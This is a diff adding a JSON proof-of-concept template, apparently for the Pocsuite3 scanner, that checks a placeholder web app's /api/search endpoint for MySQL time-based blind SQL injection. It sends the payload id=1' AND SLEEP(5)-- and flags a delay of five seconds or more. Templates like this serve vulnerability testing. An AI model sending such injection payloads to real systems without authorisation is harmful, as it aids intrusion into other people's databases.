@@ -1,0 +1,68 @@
+{
+  "pocInfo": {
+    "vulID": "example-001",
+    "version": "1",
+    "vulDate": "2025-11-01",
+    "createDate": "2025-11-01",
+    "updateDate": "2025-11-01",
+    "name": "MySQL Time-Based Blind SQL Injection Example",
+    "protocol": "http",
+    "vulType": "SQL Injection",
+    "author": "Potato",
+    "references": [
+      "https://github.com/knownsec/Pocsuite3"
+    ],
+    "appName": "Example Web App",
+    "appVersion": "1.0",
+    "appPowerLink": "https://example.com",
+    "desc": "这是一个 MySQL 时间盲注漏洞的 POC 示例。利用 SLEEP() 函数来检测 SQL 注入漏洞。如果响应时间大于等于 5 秒，说明存在 SQL 注入漏洞。",
+    "samples": [
+      "http://127.0.0.1:8080"
+    ]
+  },
+  "pocExecute": {
+    "verify": [
+      {
+        "step": "0",
+        "method": "GET",
+        "vulPath": "/api/search",
+        "params": "id=1' AND SLEEP(5)--",
+        "necessary": "",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "status": "200",
+        "match": {
+          "regex": [],
+          "time": "5"
+        }
+      }
+    ],
+    "attack": [
+      {
+        "step": "0",
+        "method": "GET",
+        "vulPath": "/api/search",
+        "params": "id=1",
+        "necessary": "",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "status": "200",
+        "match": {
+          "regex": [
+            "admin"
+          ],
+          "time": ""
+        },
+        "result": {
+          "VerifyInfo": {
+            "URL": "/api/search?id=1",
+            "Payload": "id=1' AND SLEEP(5)--"
+          }
+        }
+      }
+    ]
+  }
+}
+
